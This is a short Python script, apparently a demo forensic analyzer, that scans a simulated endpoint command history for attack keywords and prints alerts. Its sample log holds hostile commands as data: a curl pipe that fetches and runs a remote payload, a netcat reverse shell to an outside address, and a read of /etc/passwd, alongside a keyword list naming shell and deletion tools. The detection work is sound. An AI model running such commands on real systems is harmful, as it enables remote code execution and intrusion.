# Simulated forensic command history artifact extracted from an endpoint
FORENSIC_COMMAND_LOGS = [
    "10:12:05 - user logged in via ssh from 192.168.1.50",
    "10:15:22 - sudo systemctl restart nginx",
    "10:42:10 - curl http://malicious-external-feed.com/payload.sh | bash",
    "11:00:01 - cat /etc/passwd",
    "11:20:45 - nc -e /bin/sh 203.0.113.99 4444",
    "11:35:12 - python3 backup_script.py"
]

# Known malicious indicators or keywords associated with attacks
SUSPICIOUS_INDICATORS = ["curl ", "wget ", "nc -e", "bash |", "rm -rf"]

def analyze_forensic_artifacts():
    print("[*] Initializing DFIR Forensic Artifact & Timeline Analyzer...\n")
    print(f"[*] Total log lines loaded for analysis: {len(FORENSIC_COMMAND_LOGS)}")
    print("=" * 60)
    
    flagged_count = 0
    
    for line in FORENSIC_COMMAND_LOGS:
        is_suspicious = False
        matched_indicator = ""
        
        for indicator in SUSPICIOUS_INDICATORS:
            if indicator in line:
                is_suspicious = True
                matched_indicator = indicator
                break
                
        if is_suspicious:
            flagged_count += 1
            print(f"  [!] DFIR FORENSIC ALERT: Suspicious command execution detected!")
            print(f"      Artifact Line : {line}")
            print(f"      IoC Match     : '{matched_indicator}'\n")
        else:
            print(f"  [-] Normal Activity: {line}")
            
    print("=" * 60)
    print(f"[*] Forensic Analysis Completed. Total suspicious artifacts flagged: {flagged_count}")
    print("=" * 60)

if __name__ == "__main__":
    analyze_forensic_artifacts()
